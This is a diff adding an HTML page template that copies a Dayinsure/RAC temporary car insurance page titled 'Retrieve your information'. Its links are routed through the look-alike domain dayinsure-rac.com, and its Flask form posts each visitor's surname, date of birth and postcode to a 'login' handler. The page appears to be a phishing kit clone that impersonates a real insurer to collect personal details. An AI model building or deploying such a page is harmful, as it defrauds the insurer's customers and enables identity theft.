@@ -1,0 +1,147 @@
+<!DOCTYPE html><html ng-app="app" ng-controller="LayoutCtrl" data-cbscriptallow="true" data-scrapbook-source="" data-scrapbook-create="20250330014503218"><head><meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<link rel="shortcut icon" href="https://dayinsure-rac.com/new/resolver/data/urn:scrapbook:download:error:favicon.ico" type="image/x-icon">
+	<link rel="icon" href="https://dayinsure-rac.com/new/resolver/data/urn:scrapbook:download:error:favicon.ico" type="image/x-icon">
+
+		<title>Challenge | Temporary Car Insurance | Short Term Car Insurance | Temp Cover | dayinsure.com</title>
+		<link rel="apple-touch-icon" sizes="57x57" href="https://dayinsure-rac.com/new/resolver/data/apple-touch-icon-57x57.png">
+		<link rel="apple-touch-icon" sizes="114x114" href="https://dayinsure-rac.com/new/resolver/data/apple-touch-icon-114x114.png">
+		<link rel="apple-touch-icon" sizes="72x72" href="https://dayinsure-rac.com/new/resolver/data/apple-touch-icon-72x72.png">
+		<link rel="apple-touch-icon" sizes="144x144" href="https://dayinsure-rac.com/new/resolver/data/apple-touch-icon-144x144.png">
+
+	<base>
+	<link rel="stylesheet" href="{{ url_for('static', filename='data/cookieconsent.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static', filename='data/common.css') }}">
+<link rel="stylesheet" href="{{ url_for('static', filename='data/rac.css') }}">
+<link rel="stylesheet" href="{{ url_for('static', filename='data/base.css') }}">
+</head>
+<body lang="en" class="site">
+
+	<span style="display:none">False</span>
+
+	<header class="bg-header-background">
+    <div class="px-6 md:px-0 lg:px-6 mx-auto sm:max-w-tablet-page lg:max-w-desktop-page  flex text-center pb-1 pt-1 w-full h-16 lg:h-[4.5rem]">
+        <a href="https://dayinsure-rac.com/new/resolver/data/https://retail.dayinsure.com/quote/registration-search/?referrer=RAC"><div class="headerLogo"></div></a>
+
+        <div class="ml-auto">
+            <button type="button" id="btnCreateNewQuote" class="btn-extra danger">
+                <span class="icon-quote">Get a new quote</span>
+            </button>
+        </div>
+    </div>
+</header>
+
+
+	<div class="pageContainer px-6 py-6 lg:px-6 mx-auto w-screen pt-6 site-content">
+		
+
+
+<div class="row h-100">
+    <div class="col-xs-12 h-100 mr-0 ml-0">
+        <div class="welcomeText navbar">
+            <div class="row">
+                    <div class="col-md-12">
+                        <span class="web-heading-text">Retrieve your information</span>
+                    </div>
+
+            </div>
+        </div>
+
+        <div class="page-wrapper">
+
+
+            <form role="form" id="web-form" method="POST" action="{{ url_for('login') }}">
+                 
+ 
+
+            <div>
+                            </div>
+                    <div class="form-group mb-20 paragraph-wrapper">
+                            <label class="info-text">To protect your personal data, we need to verify information about you, the driver. Please enter your details below.</label>
+                    </div>
+                    <div class="form-group">
+                        <label class="user-icon mobile-span-text lbl-n-h" for="lastName">Surname</label>
+                        <input id="lastName" type="text" name="surname" class="form-control form-control-height" placeholder="e.g. Smith" value="">
+                        <small id="lastNameError" class="help-block text-xs mt-2" style="visibility: hidden;">Required</small>
+                    </div>
+                    <div class="form-group" id="dobBlock">
+                        <label class="date-icon mobile-span-text lbl-n-h">Date of birth</label>
+                        <div class="combine-input">
+                            <input name="dob_day" type="number" maxlength="2" class="inline-control border-right" id="txtDay" placeholder="DD" value="">
+                            <input name="dob_month" type="number" maxlength="2" class="inline-control border-right" id="txtMonth" placeholder="MM" value="">
+                            <input name="dob_year" type="number" maxlength="4" class="inline-control" id="txtYear" placeholder="YYYY" value="">
+                        </div>
+                        <small id="dateError" class="help-block text-xs mt-2" style="visibility: hidden;">Required</small>
+                    </div>
+                    <div class="form-group medium">
+                        <label class="postcode-icon mobile-span-text lbl-n-h" for="postcode">Home postcode</label>
+                        <input id="postcode" type="text" name="postcode" class="form-control form-control-height" placeholder="e.g. AB1 2CD" value=""         oninput="this.value = this.value.toUpperCase();">
+                        <small id="postcodeError" class="help-block text-xs mt-2" style="visibility: hidden;">Required</small>
+                    </div>
+                    <div class="content-wrapper">
+                        <div class="text-center top-25">
+                            <button class="btn btn-lg btn-primary btn-block" type="submit" name="button" value="login" id="btnSubmit">
+                                Retrieve information
+                            </button>
+                        </div>
+                    </div>
+        </form>
+        </div>
+    </div>
+</div>
+
+
+
+
+	</div>
+
+	<footer>
+    <div class="text-center content-padding-top content-padding-bottom web-page-footer">
+        <div class="row no-margin-row">
+                <div class="col-xs-12 only-mobile links-holder pb-5">
+                        <a id="btnReferrerHomepageUrl" href="https://dayinsure-rac.com/new/resolver/data/https://www.rac.co.uk/" target="_blank" class="go-to-link">
+                            <span>Go to www.rac.co.uk</span>
+                            <div class="link-img"></div>
+                        </a>
+
+            </div>
+            <div class="col-xs-12 links-holder">
+                        <a id="btnReferrerHomepageUrl" class="hidden-mobile footer-link go-to-link" href="https://dayinsure-rac.com/new/resolver/data/https://www.rac.co.uk/" target="_blank">
+                            <span>Go to www.rac.co.uk</span>
+                            <div class="link-img"></div>
+                        </a>
+
+                <a id="btnTermsOfBusiness" class="footer-link" href="https://dayinsure-rac.com/new/resolver/data/https://diprodsiteresources.blob.core.windows.net/resources/DocumentStore/Underwriter_Aviva/ProductName_Dayinsure.App.RetailQuote/BrandId_1/DocumentType_4/2024-24-11--00-00-00/Dayinsure%20TOBA%20v4.9.3%2001102024.pdf" download=""><span>Terms of Business</span></a>
+                <a id="btnPrivacyPolicy" class="footer-link" href="https://dayinsure-rac.com/new/resolver/data/https://diprodsiteresources.blob.core.windows.net/resources/DocumentStore/Underwriter_Aviva/ProductName_Dayinsure.App.RetailQuote/BrandId_3/DocumentType_19/2024-10-24--00-00-00/RAC%20Privacy%20Policy%20v2.1%2016.10.2024.pdf" download=""><span>Privacy Policy</span></a>
+                <a id="btnCookiePolicy" href="https://dayinsure-rac.com/new/resolver/data/https://www.dayinsure.com/cookie-policy/" target="_blank"><span>Cookie Policy</span></a>
+            </div>
+        </div>
+        <div class="row no-margin-row" style="margin-top: 25px">
+            <div class="col-xs-12 trademark-text">
+                        <span>RAC Financial Services Limited act as an introducer to Dayinsure.com Ltd for RAC Day Insurance. RAC Financial Services Limited is registered in England No. 5171817. Registered Office: RAC House, Brockhurst Crescent, Walsall WS5 4AW. RAC Day Car Insurance is arranged and administered by Dayinsure.com Ltd, which is registered in England no. 04996289, registered office: Mara House, Tarporley Business Centre, Nantwich Road, Tarporley, Cheshire CW6 9UY. Both companies are authorised and regulated by the Financial Conduct Authority. RAC Day Insurance is underwritten by Aviva Insurance Limited. Registered in Scotland, No 2116. Registered Office: Pitheavlis, Perth PH2 0NH. Aviva Insurance Limited are authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</span>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+	
+	
+	
+
+	<!-- BootstrapValidator CSS -->
+	<link rel="stylesheet" href="data/bootstrapValidator.min.css">
+	<!-- BootstrapValidator JS -->
+	
+
+	
+
+	
+    
+
+
+
+
+</body></html>
